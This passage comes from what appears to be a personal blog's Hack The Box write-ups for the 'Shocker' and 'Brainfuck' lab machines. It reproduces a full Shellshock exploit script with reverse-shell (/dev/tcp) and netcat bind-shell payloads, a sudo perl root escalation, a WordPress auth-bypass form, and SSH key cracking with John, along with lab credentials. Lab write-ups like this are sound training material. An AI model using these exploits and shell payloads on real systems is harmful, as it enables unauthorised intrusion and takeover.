NOPASSWD: /usr/bin/perl   Privilege Escalation Source:https://gtfobins.github.io/gtfobins/perl/\n1 2 3 4 5 6 7 8 9 10  sudo perl -e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; whoami -\u0026gt; root python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; cd root cat root.txt -\u0026gt; ********************************   Manual Exploitation Google apache2 cgi-bin exploit\n https://www.exploit-db.com/exploits/34900 Using this python code to exploit shellshock  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146  #!/usr/bin/env python from socket import * from threading import Thread import thread, time, httplib, urllib, sys stop = False proxyhost = \u0026#34;\u0026#34; proxyport = 0 def usage(): print \u0026#34;\u0026#34;\u0026#34; Shellshock apache mod_cgi remote exploit Usage: ./exploit.py var=\u0026lt;value\u0026gt; Vars: rhost: victim host rport: victim port for TCP shell binding lhost: attacker host for TCP shell reversing lport: attacker port for TCP shell reversing pages: specific cgi vulnerable pages (separated by comma) proxy: host:port proxy Payloads: \u0026#34;reverse\u0026#34; (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport) \u0026#34;bind\u0026#34; (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport) Example: ./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234 ./exploit.py payload=bind rhost=1.2.3.4 rport=1234 Credits: Federico Galatolo 2014 \u0026#34;\u0026#34;\u0026#34; sys.exit(0) def exploit(lhost,lport,rhost,rport,payload,pages): headers = {\u0026#34;Cookie\u0026#34;: payload, \u0026#34;Referer\u0026#34;: payload} for page in pages: if stop: return print \u0026#34;[-] Trying exploit on : \u0026#34;+page if proxyhost != \u0026#34;\u0026#34;: c = httplib.HTTPConnection(proxyhost,proxyport) c.request(\u0026#34;GET\u0026#34;,\u0026#34;http://\u0026#34;+rhost+page,headers=headers) res = c.getresponse() else: c = httplib.HTTPConnection(rhost) c.request(\u0026#34;GET\u0026#34;,page,headers=headers) res = c.getresponse() if res.status == 404: print \u0026#34;[*] 404 on : \u0026#34;+page time.sleep(1) args = {} for arg in sys.argv[1:]: ar = arg.split(\u0026#34;=\u0026#34;) args[ar[0]] = ar[1] try: args[\u0026#39;payload\u0026#39;] except: usage() if args[\u0026#39;payload\u0026#39;] == \u0026#39;reverse\u0026#39;: try: lhost = args[\u0026#39;lhost\u0026#39;] lport = int(args[\u0026#39;lport\u0026#39;]) rhost = args[\u0026#39;rhost\u0026#39;] payload = \u0026#34;() { :;}; /bin/bash -c /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026#34;+lhost+\u0026#34;/\u0026#34;+str(lport)+\u0026#34; 0\u0026gt;\u0026amp;1 \u0026amp;\u0026#34; except: usage() elif args[\u0026#39;payload\u0026#39;] == \u0026#39;bind\u0026#39;: try: rhost = args[\u0026#39;rhost\u0026#39;] rport = args[\u0026#39;rport\u0026#39;] payload = \u0026#34;() { :;}; /bin/bash -c \u0026#39;nc -l -p \u0026#34;+rport+\u0026#34; -e /bin/bash \u0026amp;\u0026#39;\u0026#34; except: usage() else: print \u0026#34;[*] Unsupported payload\u0026#34; usage() try: pages = args[\u0026#39;pages\u0026#39;].split(\u0026#34;,\u0026#34;) except: pages = [\u0026#34;/cgi-sys/entropysearch.cgi\u0026#34;,\u0026#34;/cgi-sys/defaultwebpage.cgi\u0026#34;,\u0026#34;/cgi-mod/index.cgi\u0026#34;,\u0026#34;/cgi-bin/test.cgi\u0026#34;,\u0026#34;/cgi-bin-sdb/printenv\u0026#34;] try: proxyhost,proxyport = args[\u0026#39;proxy\u0026#39;].split(\u0026#34;:\u0026#34;) except: pass if args[\u0026#39;payload\u0026#39;] == \u0026#39;reverse\u0026#39;: serversocket = socket(AF_INET, SOCK_STREAM) buff = 1024 addr = (lhost, lport) serversocket.bind(addr) serversocket.listen(10) print \u0026#34;[!] Started reverse shell handler\u0026#34; thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,)) if args[\u0026#39;payload\u0026#39;] == \u0026#39;bind\u0026#39;: serversocket = socket(AF_INET, SOCK_STREAM) addr = (rhost,int(rport)) thread.start_new_thread(exploit,(\u0026#34;\u0026#34;,0,rhost,rport,payload,pages,)) buff = 1024 while True: if args[\u0026#39;payload\u0026#39;] == \u0026#39;reverse\u0026#39;: clientsocket, clientaddr = serversocket.accept() print \u0026#34;[!] Successfully exploited\u0026#34; print \u0026#34;[!] Incoming connection from \u0026#34;+clientaddr[0] stop = True clientsocket.settimeout(3) while True: reply = raw_input(clientaddr[0]+\u0026#34;\u0026gt; \u0026#34;) clientsocket.sendall(reply+\u0026#34;\\n\u0026#34;) try: data = clientsocket.recv(buff) print data except: pass if args[\u0026#39;payload\u0026#39;] == \u0026#39;bind\u0026#39;: try: serversocket = socket(AF_INET, SOCK_STREAM) time.sleep(1) serversocket.connect(addr) print \u0026#34;[!] Successfully exploited\u0026#34; print \u0026#34;[!] Connected to \u0026#34;+rhost stop = True serversocket.settimeout(3) while True: reply = raw_input(rhost+\u0026#34;\u0026gt; \u0026#34;) serversocket.sendall(reply+\u0026#34;\\n\u0026#34;) data = serversocket.recv(buff) print data except: pass   1 2 3 4 5  # nano [nanme of the file from above] # add \u0026#34;/cgi-bin/user.sh\u0026#34; to pages section # Run the python script python exploit.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.35 lport=6666   Skills Learned  Exploiting shellshock Exploiting NOPASSWD  ","description":"Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers. ","id":7,"section":"posts","tags":["OSCP","linux","rce","cve","cgi","sudo","metasploit","apache"],"title":"Hackthebox - Shocker","uri":"https://hswootan.github.io/en/posts/shocker/"},{"content":"Reconnaissance \r1  nmap -sC -sV -O -vv 10.10.10.17 -oA brainfuck   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUvFkWE1DxJj4OsU4DiVLjkxYV2a9pSlMS/78hpx0IejJaFilgNb+RFCyfyhIw5NvsZB6hZiNL0vPDh+MscPd75heIIgx9mczfamsrA2KODdkdgUJPCBWUnF9/VhYQhJpGvo4f6lAwLz7wnmcjhiXencMNkZcweADi5aK0Xp6iFxYcwx6+qy0891gQ5TnVVazkDJNA+QMUamxJRm1tQN5dp/+TeBecWJH2AxQFXsM4wPkIFaE0GsKvYDmGyfy1YL/Gn5IxEqVrhIEYkDH4BQsbvORNueOtJKHoys7EhPF+STpx6ZAXS6AXhS/nJMz6EvubzeGqfBOaDIZN9u5JuCdf | 256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCJcOJZuuBlw9xDXy+VPpezMomPfySGOjABaxw02cmRifvzWE57mh1hlQD6z44IF1lsuW9E2NNH4xB4d8U0O5b0= | 256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOokdEAUqLEqEuY1CHNJ2xaDU+L+/0qb3XZO8UIZfrju 25/tcp open smtp syn-ack ttl 63 Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN 110/tcp open pop3 syn-ack ttl 63 Dovecot pop3d |_pop3-capabilities: TOP USER SASL(PLAIN) AUTH-RESP-CODE CAPA RESP-CODES PIPELINING UIDL 143/tcp open imap syn-ack ttl 63 Dovecot imapd |_imap-capabilities: OK post-login Pre-login AUTH=PLAINA0001 more ENABLE capabilities IMAP4rev1 have LITERAL+ listed SASL-IR ID LOGIN-REFERRALS IDLE 443/tcp open ssl/http syn-ack ttl 63 nginx 1.10.0 (Ubuntu) |_http-title: Welcome to nginx! | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.10.0 (Ubuntu) | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=orestis@brainfuck.htb/localityName=Athens/organizationalUnitName=IT | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb | Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=orestis@brainfuck.htb/localityName=Athens/organizationalUnitName=IT | Public Key type: rsa | Public Key bits: 3072 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2017-04-13T11:19:29 | Not valid after: 2027-04-11T11:19:29 | MD5: cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20 | SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66 | -----BEGIN CERTIFICATE----- | MIIFQzCCA6ugAwIBAgIJAI24F5h8eY+HMA0GCSqGSIb3DQEBCwUAMIGTMQswCQYD | VQQGEwJHUjEPMA0GA1UECAwGQXR0aWNhMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV | BAoMDkJyYWluZnVjayBMdGQuMQswCQYDVQQLDAJJVDEWMBQGA1UEAwwNYnJhaW5m | dWNrLmh0YjEkMCIGCSqGSIb3DQEJARYVb3Jlc3Rpc0BicmFpbmZ1Y2suaHRiMB4X | DTE3MDQxMzExMTkyOVoXDTI3MDQxMTExMTkyOVowgZMxCzAJBgNVBAYTAkdSMQ8w | DQYDVQQIDAZBdHRpY2ExDzANBgNVBAcMBkF0aGVuczEXMBUGA1UECgwOQnJhaW5m | dWNrIEx0ZC4xCzAJBgNVBAsMAklUMRYwFAYDVQQDDA1icmFpbmZ1Y2suaHRiMSQw | IgYJKoZIhvcNAQkBFhVvcmVzdGlzQGJyYWluZnVjay5odGIwggGiMA0GCSqGSIb3 | DQEBAQUAA4IBjwAwggGKAoIBgQCjBI0m6FWgcLYONyxVeMgc+PuTFJMnMUjMb8BF | t0PIDSCt10grCCfzBNDIqfU9byiokyYVvvD+sRoWJQfMjd3I3NXMxHwpcLM6X9oR | Twt1iBBJRQkTnHOs1hyCmkiM+kn2W1xdL+mwBylAUlvUReLIDdS5anE7u95ApWsD | TTUt/mMUl1DwnCqrNkt3czQzCNfCIwIhbaLjsoXsiVo1fFEr6UpsyiaXad9eTTsl | EF9k3rByXrmP1WrkaFLqGhqS4v+rYtsyKGPngjAB664aAvB2sSI0/EuOTa7WOPcV | NP3Tga+zx55qXPeo6nqCttOlAKKwiZqba5AgDAjSFdB6Q60dghWSuRYU999Ku6zA | DdwP0BoT5+kcZJENY7wx1uzysSMrtCoi8E6bfx42UwNQe/UCDDXErXat90hTB+vV | h2vaSdyR0tz3w1iIHBZH5/3rY3f+LyfE9fSg2TbGFgZNDq6O/iykVWb9SG+tl1fA | RB208Y1/mOw0+84G9RIjLVMLb0kCAwEAAaOBlzCBlDAdBgNVHQ4EFgQUj12KscJg | /6gSHzm+kzSN/psvik8wHwYDVR0jBBgwFoAUj12KscJg/6gSHzm+kzSN/psvik8w | DAYDVR0TBAUwAwEB/zALBgNVHQ8EBAMCBeAwNwYDVR0RBDAwLoIRd3d3LmJyYWlu | ZnVjay5odGKCGXN1cDNyczNjcjN0LmJyYWluZnVjay5odGIwDQYJKoZIhvcNAQEL | BQADggGBAJ11TuRhhSQfq5NHXU5fV5VkCOPUx3yKsWjt93Qm8WDD2rJcZAq8jW59 | NHDWhzDlKZMyNYv8gKJ8k6HuG3f20yeifKZulGw/YsY6dDtTzO+tooBqzjWb9irh | bpMIVXv1xBSuz+f5YGdzpvlMK/Ltt1nEQNjKXaTnjy7OGfp4isMZCzBZeKAKnjdn | +s6TgFrFA94B56naXNaNLHvv9WcFKviwDTP2PtDz0fc9hbnZz8oxE5Q6/l50NGUK | 6bGCVIjDJfM/SsWPLHb4J6chkJxlZZLmpid+s5PsKSdY0ZZ1Oxb20O2mla77hDSJ | d43t/sZRBwWPEWxAHUR8Dj5pcrbCFyi57Qu4ENc5w7H0RhRyd0/OWs6ahn2ef4Qy | DSWfdpd5CVBGdSLVlVSjzLcBDmWuyy8q5CTgJ3VzIzOreg93F2mVAF+tlNZRX9rc | dFjsS0lwXWRZqd6642VuAtf4HoAFBh9PfBtUx+t1DxCXyY7OTwnvMsnNFg9fw11v | krhc81zFeg== |_-----END CERTIFICATE-----   Exploitation  Going to → https://10.10.10.17/ and viewing the certificate information  1 2 3 4  # Adding those dns names into /etc/hosts nano /etc/hosts 10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb    Accessing both → https://brainfuck.htb/ and https://sup3rs3cr3t.brainfuck.htb/  Wordpress scan 1  wpscan --url https://brainfuck.htb -e u,ap --disable-tls-checks   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110  __ _______ _____ \\ \\  / / __ \\ / ____| \\ \\  /\\  / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.20 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: https://brainfuck.htb/ [10.10.10.17] [+] Started: Sun Feb 6 17:40:35 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: nginx/1.10.0 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: https://brainfuck.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06). | Found By: Rss Generator (Passive Detection) | - https://brainfuck.htb/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.7.3\u0026lt;/generator\u0026gt; | - https://brainfuck.htb/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.7.3\u0026lt;/generator\u0026gt; [+] WordPress theme in use: proficient | Location: https://brainfuck.htb/wp-content/themes/proficient/ | Last Updated: 2022-02-01T00:00:00.000Z | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt | [!] The version is out of date, the latest version is 3.0.74 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3 | Style Name: Proficient | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof... | Author: Specia | Author URI: https://speciatheme.com/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.0.6 (80% confidence) | Found By: Style (Passive Detection) | - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: \u0026#39;Version: 1.0.6\u0026#39; [+] Enumerating All Plugins (via Passive Methods) [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] wp-support-plus-responsive-ticket-system | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/ | Last Updated: 2019-09-03T07:57:00.000Z | [!] The version is out of date, the latest version is 9.1.2 | | Found By: Urls In Homepage (Passive Detection) | | Version: 7.1.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 \u0026lt;===============================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] admin | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] administrator | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Feb 6 17:40:59 2022 [+] Requests Done: 25 [+] Cached Requests: 39 [+] Data Sent: 6.472 KB [+] Data Received: 60.767 KB [+] Memory used: 229.125 MB [+] Elapsed time: 00:00:24    Found 2 users admin and administrator Plugin vulnerable → [+] wp-support-plus-responsive-ticket-system (Version: 7.1.3 (100% confidence))  1 2 3 4  searchsploit wp support -\u0026gt; WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation | php/webapps/41006.txt -\u0026gt; WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection | php/webapps/40939.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  searchsploit -x 41006.txt ------------------------------------------------------------ # Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation # Date: 10-01-2017 # Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/ # Exploit Author: Kacper Szurek # Contact: http://twitter.com/KacperSzurek # Website: http://security.szurek.pl/ # Category: web 1. Description You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie(). http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html 2. Proof of Concept \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;http://wp/wp-admin/admin-ajax.php\u0026#34;\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;administrator\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;sth\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;action\u0026#34; value=\u0026#34;loginGuestFacebook\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; Then you can go to admin panel. ------------------------------------------------------------   1 2 3 4 5 6 7 8 9 10 11 12 13  # Create a file called exploit.html # action=\u0026#34;https://brainfuck.htb/admin-ajax.php\u0026#34; # input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;admin\u0026#34; # name=\u0026#34;email\u0026#34; value=\u0026#34;orestis@brainfuck.htb\u0026#34; ---------------------------------------------------------------- \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;https://brainfuck.htb/wp-admin/admin-ajax.php\u0026#34;\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;admin\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;orestis@brainfuck.htb\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;action\u0026#34; value=\u0026#34;loginGuestFacebook\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; ----------------------------------------------------------------    After creating the payload we can host the form using python  python -m SimpleHTTPServer # within the file that contains the html form\rgo to -\u0026gt; localhost.com:8000 and click login\rgo back to the website -\u0026gt; https://brainfuck.htb/ # We are logged-in ##SMTP\n Going to Dashboard → Appearance → Editor The files are not writable to get a shell Going to Settings → Easy WP SMTP  Found:  SMTP username: orestis SMTP Password: kHGuERB29DNiNE # Inspect element on the password field to get the password      1  sudo apt-get install evolution # Download evolution mail client    Open the evolution program → next → next  Full Name: Orestis\nEmail Address: orestis@brainfuck.htb\n Server: brainfuck.htb Username: orestis Port: 143 No encryption Skip Options   Server: brainfuck.htb Port: 25 Encryption method: No encryption  Enter the password in the mail application: kHGuERB29DNiNE\n1 2 3 4 5 6  Hi there, your credentials for our \u0026#34;secret\u0026#34; forum are below :) username: \u0026lt;mark\u0026gt;\u0026lt;span style=\u0026#34;color:red\u0026#34;\u0026gt;**admin**\u0026lt;/span\u0026gt;\u0026lt;/mark\u0026gt; and \u0026lt;mark\u0026gt;\u0026lt;span style=\u0026#34;color:red\u0026#34;\u0026gt;**orestis**\u0026lt;/span\u0026gt;\u0026lt;/mark\u0026gt; password: \u0026lt;mark\u0026gt;\u0026lt;span style=\u0026#34;color:red\u0026#34;\u0026gt;**admin**\u0026lt;/span\u0026gt;\u0026lt;/mark\u0026gt; and \u0026lt;mark\u0026gt;\u0026lt;span style=\u0026#34;color:red\u0026#34;\u0026gt;**kIEnnfEKJ#9UmdO**\u0026lt;/span\u0026gt;\u0026lt;/mark\u0026gt; Regards    Creds -\u0026gt; username: orestis | password: kIEnnfEKJ#9UmdO  1 2 3 4 5 6 7 8 9 10 11  Your new WordPress site has been successfully set up at: https://brainfuck.htb You can log in to the administrator account with the following information: Username: admin Password: The password you chose during the install. Log in here: https://brainfuck.htb/wp-login.php We hope you enjoy your new site. Thanks!    Login with the creds found in the Super Secret Forum orestis | kIEnnfEKJ#9UmdO Identified that is Vigenere cipher  https://www.dcode.fr/vigenere-cipher  Vigenere Ciphertext → Pieagnm - Jkoijeg nbw zwx mle grwsnn Keypassword → Orestis - Hacking for fun and profit → Brainfu - Ckmybra inf uck myb rainfu → brainfuck     Decipher the rest of the message  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  Cipher: Vigenere | key: fuckmybrain ---------------------------------------- orestis Mya qutf de buj otv rms dy srd vkdof Pieagnm - Jkoijeg nbw zwx mle grwsnn admin Xua zxcbje iai c leer nzgpg ii uy... orestis Ufgoqcbje.... Wejmvse - Fbtkqal zqb rso rnl cwihsf admin Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr orestis Si rbazmvm, Q\u0026#39;yq vtefc gfrkr nn Qbqquzs - Pnhekxs dpi fca fhf zdmgzt ---------------------------------------- orestis Hey give me the url for my key bitch Orestis - Hacking for fun and profit admin Say please and i just might do so... orestis Pleeeease.... Orestis - Hacking for fun and profit admin There you go you stupid fuck, I hope you remember your key password because I dont https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa No problem, I\u0026#39;ll brute force it Orestis - Hacking for fun and profit   Interesting → There you go you stupid fuck, I hope you remember your key password because I dont https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa No problem, I\u0026rsquo;ll brute force it Orestis - Hacking for fun and profit\n We have encrypted id_rsa we need to use JohnTheRipper. We will be using ssh2john.py  1 2 3 4 5 6 7 8 9 10 11 12 13 14  locate ssh2john /usr/share/john/ssh2john.py id_rsa \u0026gt; forjohn.txt john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt -\u0026gt; Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 3poulakia! (id_rsa) 1g 0:00:00:06 DONE (2022-02-06 21:12) 0.1579g/s 1968Kp/s 1968Kc/s 1968KC/s 3poulakia! Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed.    Found ssh password 3poulakia!  1 2 3 4 5  ssh -i id_rsa orestis@10.10.10.17 -\u0026gt; password for id_rsa -\u0026gt; 3poulakia! cat user.txt -\u0026gt; ********************************   Privilege Escalation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  orestis@brainfuck:~$ ls -\u0026gt; debug.txt encrypt.sage mail output.txt user.txt orestis@brainfuck:~$ cat encrypt.sage nbits = 1024 password = open(\u0026#34;/root/root.txt\u0026#34;).read().strip() enc_pass = open(\u0026#34;output.txt\u0026#34;,\u0026#34;w\u0026#34;) debug = open(\u0026#34;debug.txt\u0026#34;,\u0026#34;w\u0026#34;) m = Integer(int(password.encode(\u0026#39;hex\u0026#39;),16)) p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False) q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False) n = p*q phi = (p-1)*(q-1) e = ZZ.random_element(phi) while gcd(e, phi) != 1: e = ZZ.random_element(phi) c = pow(m, e, n) enc_pass.write(\u0026#39;Encrypted Password: \u0026#39;+str(c)+\u0026#39;\\n\u0026#39;) debug.write(str(p)+\u0026#39;\\n\u0026#39;) debug.write(str(q)+\u0026#39;\\n\u0026#39;) debug.write(str(e)+\u0026#39;\\n\u0026#39;)    Google and paste p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False) →https://ctftime.org/writeup/6434. It is RSA Google how to decrypt RSA p q e  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  # Source: -\u0026gt; https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e nano decypher.txt --------------- def egcd(a, b): x,y, u,v = 0,1, 1,0 while a != 0: q, r = b//a, b%a m, n = x-u*q, y-v*q b,a, x,y, u,v = a,r, u,v, m,n gcd = b return gcd, x, y def main(): p = 1090660992520643446103273789680343 q = 1162435056374824133712043309728653 e = 65537 ct = 299604539773691895576847697095098784338054746292313044353582078965 # compute n n = p * q # Compute phi(n) phi = (p - 1) * (q - 1) # Compute modular inverse of e gcd, a, b = egcd(e, phi) d = a print( \u0026#34;n: \u0026#34; + str(d) ); # Decrypt ciphertext pt = pow(ct, d, n) print( \u0026#34;pt: \u0026#34; + str(pt) ) if __name__ == \u0026#34;__main__\u0026#34;: main()   1 2 3 4  restis@brainfuck:~$ cat debug.txt 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 # p value 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 # q value 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 # e value   1 2  orestis@brainfuck:~$ cat output.txt Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182 # replace this value in ct   1 2 3  python decrypt.py n: 8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977 pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750    Convert decimal to Hex →https://www.rapidtables.com/convert/number/decimal-to-hex.html Convert Hex to String →https://string-functions.com/hex-string.aspx  1 2 3 4 5 6  Decimal: 24604052029401386049980296953784287079059245867880966944246662849341507003750 to Hex: 